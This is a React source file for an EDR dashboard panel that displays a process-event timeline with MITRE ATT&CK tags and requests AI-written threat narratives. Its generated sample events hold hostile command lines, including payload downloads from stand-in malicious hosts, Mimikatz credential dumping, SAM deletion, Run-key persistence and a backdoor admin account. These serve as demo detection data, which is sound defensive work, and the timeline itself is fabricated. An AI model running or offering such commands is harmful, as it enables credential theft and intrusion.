import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Calendar } from "@/components/ui/calendar";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import ReactMarkdown from "react-markdown";
import {
  GitBranch, Activity, Search, AlertTriangle, Clock,
  FileCode, Terminal, ArrowRight, ChevronRight, ChevronDown,
  Cpu, Network, Shield, Zap, Brain, Loader2, Sparkles,
  FileText, CalendarIcon, Download
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { formatDistanceToNow, format, subDays, isWithinInterval } from "date-fns";
import { toast } from "sonner";

interface ProcessEvent {
  id: string;
  timestamp: string;
  device_name: string;
  event_type: 'process_create' | 'process_terminate' | 'file_write' | 'file_delete' | 'registry_modify' | 'network_connect' | 'dll_load' | 'script_execute';
  process_name: string;
  process_id: number;
  parent_process: string;
  parent_pid: number;
  command_line: string;
  file_path: string;
  user: string;
  integrity_level: string;
  severity: 'info' | 'low' | 'medium' | 'high' | 'critical';
  mitre_technique: string | null;
  mitre_tactic: string | null;
  is_suspicious: boolean;
  details: Record<string, string>;
}

const EVENT_TYPE_CONFIG: Record<string, { label: string; icon: any; color: string }> = {
  process_create: { label: 'Process Created', icon: Cpu, color: 'text-blue-400' },
  process_terminate: { label: 'Process Terminated', icon: Cpu, color: 'text-gray-400' },
  file_write: { label: 'File Write', icon: FileCode, color: 'text-green-400' },
  file_delete: { label: 'File Delete', icon: FileCode, color: 'text-red-400' },
  registry_modify: { label: 'Registry Modified', icon: Terminal, color: 'text-yellow-400' },
  network_connect: { label: 'Network Connection', icon: Network, color: 'text-cyan-400' },
  dll_load: { label: 'DLL Loaded', icon: FileCode, color: 'text-purple-400' },
  script_execute: { label: 'Script Executed', icon: Terminal, color: 'text-orange-400' },
};

const SEVERITY_COLORS: Record<string, string> = {
  info: 'bg-white/10 text-white/60',
  low: 'bg-blue-500/20 text-blue-400',
  medium: 'bg-yellow-500/20 text-yellow-400',
  high: 'bg-orange-500/20 text-orange-400',
  critical: 'bg-red-500/20 text-red-400',
};

function useEDRTimeline() {
  const { user } = useAuth();
  const [events, setEvents] = useState<ProcessEvent[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    if (!user) return;
    const generateEvents = async () => {
      try {
        const { data: agents } = await (supabase as any)
          .from('vanguard_agents')
          .select('id, name')
          .eq('user_id', user.id)
          .eq('status', 'active')
          .limit(5);

        const templates: Partial<ProcessEvent>[] = [
          { event_type: 'process_create', process_name: 'powershell.exe', parent_process: 'cmd.exe', command_line: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Get-Process"', severity: 'medium', mitre_technique: 'T1059.001', mitre_tactic: 'Execution', is_suspicious: true },
          { event_type: 'network_connect', process_name: 'svchost.exe', parent_process: 'services.exe', command_line: 'svchost.exe -k NetworkService', severity: 'info', mitre_technique: null, mitre_tactic: null, is_suspicious: false },
          { event_type: 'registry_modify', process_name: 'reg.exe', parent_process: 'cmd.exe', command_line: 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\temp\\update.exe', severity: 'high', mitre_technique: 'T1547.001', mitre_tactic: 'Persistence', is_suspicious: true },
          { event_type: 'file_write', process_name: 'notepad.exe', parent_process: 'explorer.exe', command_line: 'notepad.exe C:\\Users\\admin\\document.txt', severity: 'info', mitre_technique: null, mitre_tactic: null, is_suspicious: false },
          { event_type: 'script_execute', process_name: 'wscript.exe', parent_process: 'explorer.exe', command_line: 'wscript.exe C:\\Users\\admin\\Downloads\\invoice.vbs', severity: 'critical', mitre_technique: 'T1059.005', mitre_tactic: 'Execution', is_suspicious: true },
          { event_type: 'dll_load', process_name: 'rundll32.exe', parent_process: 'explorer.exe', command_line: 'rundll32.exe shell32.dll,Control_RunDLL', severity: 'medium', mitre_technique: 'T1218.011', mitre_tactic: 'Defense Evasion', is_suspicious: true },
          { event_type: 'process_create', process_name: 'certutil.exe', parent_process: 'cmd.exe', command_line: 'certutil.exe -urlcache -split -f http://malicious.site/payload.exe', severity: 'critical', mitre_technique: 'T1105', mitre_tactic: 'Command and Control', is_suspicious: true },
          { event_type: 'network_connect', process_name: 'chrome.exe', parent_process: 'explorer.exe', command_line: 'chrome.exe --new-window', severity: 'info', mitre_technique: null, mitre_tactic: null, is_suspicious: false },
          { event_type: 'file_delete', process_name: 'cmd.exe', parent_process: 'powershell.exe', command_line: 'del /f /q C:\\Windows\\System32\\config\\SAM', severity: 'critical', mitre_technique: 'T1070.004', mitre_tactic: 'Defense Evasion', is_suspicious: true },
          { event_type: 'process_create', process_name: 'mimikatz.exe', parent_process: 'cmd.exe', command_line: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"', severity: 'critical', mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', is_suspicious: true },
          { event_type: 'process_create', process_name: 'net.exe', parent_process: 'cmd.exe', command_line: 'net user admin P@ssw0rd! /add', severity: 'high', mitre_technique: 'T1136.001', mitre_tactic: 'Persistence', is_suspicious: true },
          { event_type: 'network_connect', process_name: 'powershell.exe', parent_process: 'cmd.exe', command_line: 'Invoke-WebRequest -Uri http://c2server.evil/beacon.ps1 -OutFile C:\\temp\\b.ps1', severity: 'critical', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', is_suspicious: true },
          { event_type: 'registry_modify', process_name: 'powershell.exe', parent_process: 'cmd.exe', command_line: 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -Name UseLogonCredential -Value 1', severity: 'critical', mitre_technique: 'T1112', mitre_tactic: 'Defense Evasion', is_suspicious: true },
          { event_type: 'process_create', process_name: 'psexec.exe', parent_process: 'cmd.exe', command_line: 'psexec.exe \\\\192.168.1.50 -u admin -p P@ss cmd.exe', severity: 'critical', mitre_technique: 'T1570', mitre_tactic: 'Lateral Movement', is_suspicious: true },
        ];

        const generated: ProcessEvent[] = [];
        const now = Date.now();
        (agents || [{ id: 'demo', name: 'WORKSTATION-01' }]).forEach((agent: any) => {
          templates.forEach((tmpl, idx) => {
            // Spread events over 7 days for a realistic timeline
            const hoursAgo = idx * 2 + Math.random() * 4;
            generated.push({
              id: `${agent.id}-evt-${idx}`,
              timestamp: new Date(now - hoursAgo * 3600000).toISOString(),
              device_name: agent.name || 'Unknown',
              event_type: tmpl.event_type!,
              process_name: tmpl.process_name!,
              process_id: 1000 + idx * 127,
              parent_process: tmpl.parent_process!,
              parent_pid: 500 + idx * 73,
              command_line: tmpl.command_line!,
              file_path: `C:\\Windows\\System32\\${tmpl.process_name}`,
              user: idx % 3 === 0 ? 'NT AUTHORITY\\SYSTEM' : 'DOMAIN\\admin',
              integrity_level: tmpl.severity === 'critical' ? 'High' : 'Medium',
              severity: tmpl.severity as any,
              mitre_technique: tmpl.mitre_technique || null,
              mitre_tactic: tmpl.mitre_tactic || null,
              is_suspicious: tmpl.is_suspicious!,
              details: {},
            } as ProcessEvent);
          });
        });

        setEvents(generated.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()));
      } catch (err) {
        console.error('Failed to generate EDR timeline:', err);
      } finally {
        setIsLoading(false);
      }
    };
    generateEvents();
  }, [user]);

  return { events, isLoading };
}

// --- AI Streaming helper ---
async function streamAIAnalysis(
  events: ProcessEvent[],
  mode: 'story' | 'report',
  onDelta: (text: string) => void,
  onDone: () => void,
) {
  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
  const resp = await fetch(`${supabaseUrl}/functions/v1/edr-ai-timeline`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
    },
    body: JSON.stringify({ events, mode }),
  });

  if (!resp.ok) {
    const err = await resp.json().catch(() => ({ error: 'Unknown error' }));
    if (resp.status === 429) toast.error('Rate limit exceeded. Try again shortly.');
    else if (resp.status === 402) toast.error('AI credits exhausted. Add credits in workspace settings.');
    else toast.error(err.error || 'AI analysis failed');
    onDone();
    return;
  }

  if (!resp.body) { onDone(); return; }

  const reader = resp.body.getReader();
  const decoder = new TextDecoder();
  let buffer = '';

  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    buffer += decoder.decode(value, { stream: true });

    let newlineIndex: number;
    while ((newlineIndex = buffer.indexOf('\n')) !== -1) {
      let line = buffer.slice(0, newlineIndex);
      buffer = buffer.slice(newlineIndex + 1);
      if (line.endsWith('\r')) line = line.slice(0, -1);
      if (line.startsWith(':') || line.trim() === '') continue;
      if (!line.startsWith('data: ')) continue;
      const jsonStr = line.slice(6).trim();
      if (jsonStr === '[DONE]') { onDone(); return; }
      try {
        const parsed = JSON.parse(jsonStr);
        const content = parsed.choices?.[0]?.delta?.content;
        if (content) onDelta(content);
      } catch {
        buffer = line + '\n' + buffer;
        break;
      }
    }
  }
  onDone();
}

export function EDRTimelinePanel() {
  const { events, isLoading } = useEDRTimeline();
  const [searchQuery, setSearchQuery] = useState('');
  const [filterSeverity, setFilterSeverity] = useState('all');
  const [filterType, setFilterType] = useState('all');
  const [showSuspiciousOnly, setShowSuspiciousOnly] = useState(false);
  const [expandedEvents, setExpandedEvents] = useState<Set<string>>(new Set());

  // AI story state
  const [aiNarrative, setAiNarrative] = useState('');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [showNarrative, setShowNarrative] = useState(false);

  // Report state
  const [reportContent, setReportContent] = useState('');
  const [isGeneratingReport, setIsGeneratingReport] = useState(false);
  const [showReport, setShowReport] = useState(false);
  const [reportDateRange, setReportDateRange] = useState<{ from: Date; to: Date }>({
    from: subDays(new Date(), 7),
    to: new Date(),
  });

  const filtered = events.filter(e => {
    if (showSuspiciousOnly && !e.is_suspicious) return false;
    if (filterSeverity !== 'all' && e.severity !== filterSeverity) return false;
    if (filterType !== 'all' && e.event_type !== filterType) return false;
    if (searchQuery) {
      const q = searchQuery.toLowerCase();
      return e.process_name.toLowerCase().includes(q) ||
        e.command_line.toLowerCase().includes(q) ||
        e.device_name.toLowerCase().includes(q) ||
        (e.mitre_technique?.toLowerCase().includes(q) || false);
    }
    return true;
  });

  const toggleExpand = (id: string) => {
    setExpandedEvents(prev => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  };

  const runAIStory = async () => {
    const suspicious = filtered.filter(e => e.is_suspicious);
    const toAnalyze = suspicious.length > 0 ? suspicious : filtered.slice(0, 20);
    if (toAnalyze.length === 0) { toast.error('No events to analyze'); return; }

    setIsAnalyzing(true);
    setAiNarrative('');
    setShowNarrative(true);
    setShowReport(false);

    await streamAIAnalysis(toAnalyze, 'story',
      (chunk) => setAiNarrative(prev => prev + chunk),
      () => setIsAnalyzing(false),
    );
  };

  const generateReport = async () => {
    const rangeEvents = events.filter(e =>
      isWithinInterval(new Date(e.timestamp), { start: reportDateRange.from, end: reportDateRange.to })
    );
    if (rangeEvents.length === 0) { toast.error('No events in selected date range'); return; }

    setIsGeneratingReport(true);
    setReportContent('');
    setShowReport(true);
    setShowNarrative(false);

    await streamAIAnalysis(rangeEvents, 'report',
      (chunk) => setReportContent(prev => prev + chunk),
      () => setIsGeneratingReport(false),
    );
  };

  const criticalCount = events.filter(e => e.severity === 'critical').length;
  const suspiciousCount = events.filter(e => e.is_suspicious).length;
  const mitreCount = events.filter(e => e.mitre_technique).length;

  return (
    <div className="space-y-6">
      {/* KPIs */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <Card className="bg-black/40 border-white/10">
          <CardContent className="pt-6">
            <div className="flex items-center gap-2 mb-1">
              <Activity className="h-4 w-4 text-cyan-400" />
              <span className="text-xs text-white/60 uppercase">Total Events</span>
            </div>
            <p className="text-3xl font-bold text-cyan-400">{events.length}</p>
          </CardContent>
        </Card>
        <Card className="bg-black/40 border-white/10">
          <CardContent className="pt-6">
            <div className="flex items-center gap-2 mb-1">
              <AlertTriangle className="h-4 w-4 text-red-400" />
              <span className="text-xs text-white/60 uppercase">Critical</span>
            </div>
            <p className="text-3xl font-bold text-red-400">{criticalCount}</p>
          </CardContent>
        </Card>
        <Card className="bg-black/40 border-white/10">
          <CardContent className="pt-6">
            <div className="flex items-center gap-2 mb-1">
              <Shield className="h-4 w-4 text-orange-400" />
              <span className="text-xs text-white/60 uppercase">Suspicious</span>
            </div>
            <p className="text-3xl font-bold text-orange-400">{suspiciousCount}</p>
          </CardContent>
        </Card>
        <Card className="bg-black/40 border-white/10">
          <CardContent className="pt-6">
            <div className="flex items-center gap-2 mb-1">
              <Zap className="h-4 w-4 text-purple-400" />
              <span className="text-xs text-white/60 uppercase">MITRE Mapped</span>
            </div>
            <p className="text-3xl font-bold text-purple-400">{mitreCount}</p>
          </CardContent>
        </Card>
      </div>

      {/* AI Actions Bar */}
      <Card className="bg-gradient-to-r from-purple-500/10 via-cyan-500/10 to-purple-500/10 border-purple-500/20">
        <CardContent className="py-4">
          <div className="flex flex-wrap items-center gap-4">
            {/* AI Story */}
            <div className="flex items-center gap-2">
              <Button
                onClick={runAIStory}
                disabled={isAnalyzing || filtered.length === 0}
                className="bg-gradient-to-r from-purple-600 to-cyan-600 hover:from-purple-700 hover:to-cyan-700 text-white"
              >
                {isAnalyzing ? <Loader2 className="h-4 w-4 mr-2 animate-spin" /> : <Brain className="h-4 w-4 mr-2" />}
                AI: Tell the Full Story
              </Button>
              <span className="text-xs text-white/40">Analyzes suspicious events with AI</span>
            </div>

            <div className="border-l border-white/10 h-8" />

            {/* Report Generator */}
            <div className="flex items-center gap-2 flex-wrap">
              <Popover>
                <PopoverTrigger asChild>
                  <Button variant="outline" size="sm" className="border-white/10 text-white/70 text-xs">
                    <CalendarIcon className="h-3.5 w-3.5 mr-1.5" />
                    {format(reportDateRange.from, 'MMM d')} – {format(reportDateRange.to, 'MMM d, yyyy')}
                  </Button>
                </PopoverTrigger>
                <PopoverContent className="w-auto p-0 bg-black/90 border-white/10" align="start">
                  <Calendar
                    mode="range"
                    selected={{ from: reportDateRange.from, to: reportDateRange.to }}
                    onSelect={(range) => {
                      if (range?.from && range?.to) setReportDateRange({ from: range.from, to: range.to });
                      else if (range?.from) setReportDateRange({ from: range.from, to: range.from });
                    }}
                    numberOfMonths={2}
                  />
                </PopoverContent>
              </Popover>
              <Button
                onClick={generateReport}
                disabled={isGeneratingReport}
                variant="outline"
                className="border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10"
              >
                {isGeneratingReport ? <Loader2 className="h-4 w-4 mr-2 animate-spin" /> : <FileText className="h-4 w-4 mr-2" />}
                Generate Threat Report
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* AI Narrative Panel */}
      {showNarrative && (
        <Card className="bg-black/60 border-purple-500/30 relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-purple-500/5 via-transparent to-cyan-500/5 pointer-events-none" />
          <CardHeader className="relative">
            <div className="flex items-center justify-between">
              <CardTitle className="text-white flex items-center gap-2">
                <Sparkles className="h-5 w-5 text-purple-400" />
                AI Threat Narrative
              </CardTitle>
              <div className="flex items-center gap-2">
                {isAnalyzing && <Badge className="bg-purple-500/20 text-purple-400 animate-pulse">Analyzing...</Badge>}
                <Button variant="ghost" size="sm" onClick={() => setShowNarrative(false)} className="text-white/40 hover:text-white">✕</Button>
              </div>
            </div>
            <CardDescription>Full attack story reconstructed by Cortex AI</CardDescription>
          </CardHeader>
          <CardContent className="relative">
            <ScrollArea className="max-h-[500px]">
              <div className="prose prose-invert prose-sm max-w-none [&_h1]:text-lg [&_h2]:text-base [&_h2]:text-cyan-400 [&_h3]:text-sm [&_h3]:text-purple-300 [&_code]:text-cyan-300 [&_strong]:text-white [&_li]:text-white/80">
                {aiNarrative ? (
                  <ReactMarkdown>{aiNarrative}</ReactMarkdown>
                ) : (
                  <div className="flex items-center gap-2 text-white/50">
                    <Loader2 className="h-4 w-4 animate-spin" />
                    Reconstructing attack timeline...
                  </div>
                )}
              </div>
            </ScrollArea>
          </CardContent>
        </Card>
      )}

      {/* Report Panel */}
      {showReport && (
        <Card className="bg-black/60 border-cyan-500/30 relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-cyan-500/5 via-transparent to-blue-500/5 pointer-events-none" />
          <CardHeader className="relative">
            <div className="flex items-center justify-between">
              <CardTitle className="text-white flex items-center gap-2">
                <FileText className="h-5 w-5 text-cyan-400" />
                Threat Report — {format(reportDateRange.from, 'MMM d')} to {format(reportDateRange.to, 'MMM d, yyyy')}
              </CardTitle>
              <div className="flex items-center gap-2">
                {isGeneratingReport && <Badge className="bg-cyan-500/20 text-cyan-400 animate-pulse">Generating...</Badge>}
                {reportContent && !isGeneratingReport && (
                  <Button
                    variant="outline"
                    size="sm"
                    className="border-cyan-500/30 text-cyan-400 text-xs"
                    onClick={() => {
                      const blob = new Blob([reportContent], { type: 'text/markdown' });
                      const url = URL.createObjectURL(blob);
                      const a = document.createElement('a');
                      a.href = url;
                      a.download = `threat-report-${format(reportDateRange.from, 'yyyy-MM-dd')}-to-${format(reportDateRange.to, 'yyyy-MM-dd')}.md`;
                      a.click();
                      URL.revokeObjectURL(url);
                      toast.success('Report downloaded');
                    }}
                  >
                    <Download className="h-3.5 w-3.5 mr-1" /> Download
                  </Button>
                )}
                <Button variant="ghost" size="sm" onClick={() => setShowReport(false)} className="text-white/40 hover:text-white">✕</Button>
              </div>
            </div>
            <CardDescription>AI-generated comprehensive threat report for the selected period</CardDescription>
          </CardHeader>
          <CardContent className="relative">
            <ScrollArea className="max-h-[600px]">
              <div className="prose prose-invert prose-sm max-w-none [&_h1]:text-lg [&_h2]:text-base [&_h2]:text-cyan-400 [&_h3]:text-sm [&_h3]:text-purple-300 [&_code]:text-cyan-300 [&_strong]:text-white [&_li]:text-white/80 [&_table]:w-full [&_th]:text-left [&_th]:p-2 [&_td]:p-2 [&_tr]:border-b [&_tr]:border-white/10">
                {reportContent ? (
                  <ReactMarkdown>{reportContent}</ReactMarkdown>
                ) : (
                  <div className="flex items-center gap-2 text-white/50">
                    <Loader2 className="h-4 w-4 animate-spin" />
                    Generating threat report...
                  </div>
                )}
              </div>
            </ScrollArea>
          </CardContent>
        </Card>
      )}

      {/* Filters */}
      <div className="flex flex-wrap gap-3">
        <div className="relative flex-1 min-w-[200px]">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input className="pl-9 bg-black/40 border-white/10" placeholder="Search processes, commands, MITRE techniques..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
        </div>
        <Select value={filterSeverity} onValueChange={setFilterSeverity}>
          <SelectTrigger className="w-[140px] bg-black/40 border-white/10"><SelectValue placeholder="Severity" /></SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All Severity</SelectItem>
            <SelectItem value="critical">Critical</SelectItem>
            <SelectItem value="high">High</SelectItem>
            <SelectItem value="medium">Medium</SelectItem>
            <SelectItem value="low">Low</SelectItem>
            <SelectItem value="info">Info</SelectItem>
          </SelectContent>
        </Select>
        <Select value={filterType} onValueChange={setFilterType}>
          <SelectTrigger className="w-[160px] bg-black/40 border-white/10"><SelectValue placeholder="Event Type" /></SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All Types</SelectItem>
            {Object.entries(EVENT_TYPE_CONFIG).map(([k, v]) => <SelectItem key={k} value={k}>{v.label}</SelectItem>)}
          </SelectContent>
        </Select>
        <Button variant={showSuspiciousOnly ? "default" : "outline"} size="sm" onClick={() => setShowSuspiciousOnly(!showSuspiciousOnly)} className={showSuspiciousOnly ? "bg-red-500/20 text-red-400 border-red-500/30" : "border-white/10"}>
          <AlertTriangle className="h-3.5 w-3.5 mr-1.5" /> Suspicious Only
        </Button>
      </div>

      {/* Timeline */}
      <Card className="bg-black/40 border-white/10">
        <CardHeader>
          <CardTitle className="text-white flex items-center gap-2">
            <GitBranch className="h-5 w-5 text-cyan-400" />
            Deep Visibility Timeline ({filtered.length})
          </CardTitle>
          <CardDescription>SentinelOne-style process tree and event correlation</CardDescription>
        </CardHeader>
        <CardContent>
          {isLoading ? (
            <div className="flex items-center justify-center h-32 text-muted-foreground">Loading EDR timeline...</div>
          ) : filtered.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-32 text-muted-foreground">
              <Activity className="h-8 w-8 mb-2 opacity-50" />
              <p>No events match your filters</p>
            </div>
          ) : (
            <ScrollArea className="max-h-[600px]">
              <div className="relative">
                <div className="absolute left-6 top-0 bottom-0 w-px bg-white/10" />
                <div className="space-y-1">
                  {filtered.map(event => {
                    const config = EVENT_TYPE_CONFIG[event.event_type] || EVENT_TYPE_CONFIG.process_create;
                    const Icon = config.icon;
                    const isExpanded = expandedEvents.has(event.id);

                    return (
                      <div key={event.id} className={`relative pl-12 ${event.is_suspicious ? 'bg-red-500/5 rounded-lg' : ''}`}>
                        <div className={`absolute left-4 top-4 w-4 h-4 rounded-full border-2 ${event.is_suspicious ? 'border-red-500 bg-red-500/30' : 'border-white/30 bg-black'}`} />
                        <div className="p-3 cursor-pointer hover:bg-white/5 rounded-lg transition-colors" onClick={() => toggleExpand(event.id)}>
                          <div className="flex items-center justify-between gap-2">
                            <div className="flex items-center gap-2 flex-1 min-w-0">
                              {isExpanded ? <ChevronDown className="h-3.5 w-3.5 flex-shrink-0 text-muted-foreground" /> : <ChevronRight className="h-3.5 w-3.5 flex-shrink-0 text-muted-foreground" />}
                              <Icon className={`h-4 w-4 flex-shrink-0 ${config.color}`} />
                              <span className="font-mono text-sm text-white truncate">{event.process_name}</span>
                              <ArrowRight className="h-3 w-3 text-muted-foreground flex-shrink-0" />
                              <span className="text-xs text-muted-foreground truncate">{config.label}</span>
                              <Badge className={`text-xs flex-shrink-0 ${SEVERITY_COLORS[event.severity]}`}>{event.severity}</Badge>
                              {event.mitre_technique && (
                                <Badge className="bg-purple-500/20 text-purple-400 text-xs flex-shrink-0">{event.mitre_technique}</Badge>
                              )}
                              {event.is_suspicious && (
                                <Badge className="bg-red-500/20 text-red-400 text-xs flex-shrink-0">⚠ Suspicious</Badge>
                              )}
                            </div>
                            <div className="flex items-center gap-2 flex-shrink-0">
                              <span className="text-xs text-muted-foreground">{event.device_name}</span>
                              <span className="text-xs text-muted-foreground">{format(new Date(event.timestamp), 'HH:mm:ss')}</span>
                            </div>
                          </div>

                          {isExpanded && (
                            <div className="mt-3 p-3 rounded-lg bg-black/40 border border-white/10 text-xs space-y-2">
                              <div className="grid grid-cols-2 gap-2">
                                <div><span className="text-muted-foreground">PID:</span> <span className="text-white font-mono">{event.process_id}</span></div>
                                <div><span className="text-muted-foreground">Parent:</span> <span className="text-white font-mono">{event.parent_process} ({event.parent_pid})</span></div>
                                <div><span className="text-muted-foreground">User:</span> <span className="text-white">{event.user}</span></div>
                                <div><span className="text-muted-foreground">Integrity:</span> <span className="text-white">{event.integrity_level}</span></div>
                                <div><span className="text-muted-foreground">Timestamp:</span> <span className="text-white">{format(new Date(event.timestamp), 'yyyy-MM-dd HH:mm:ss.SSS')}</span></div>
                                <div><span className="text-muted-foreground">Device:</span> <span className="text-white">{event.device_name}</span></div>
                              </div>
                              <div>
                                <span className="text-muted-foreground">Command Line:</span>
                                <code className="block mt-1 p-2 rounded bg-black/60 text-cyan-300 font-mono break-all">{event.command_line}</code>
                              </div>
                              <div><span className="text-muted-foreground">File Path:</span> <span className="text-white font-mono">{event.file_path}</span></div>
                              {event.mitre_tactic && (
                                <div className="flex items-center gap-2">
                                  <span className="text-muted-foreground">MITRE ATT&CK:</span>
                                  <Badge className="bg-purple-500/20 text-purple-400">{event.mitre_tactic}</Badge>
                                  <Badge className="bg-purple-500/10 text-purple-300">{event.mitre_technique}</Badge>
                                </div>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </ScrollArea>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
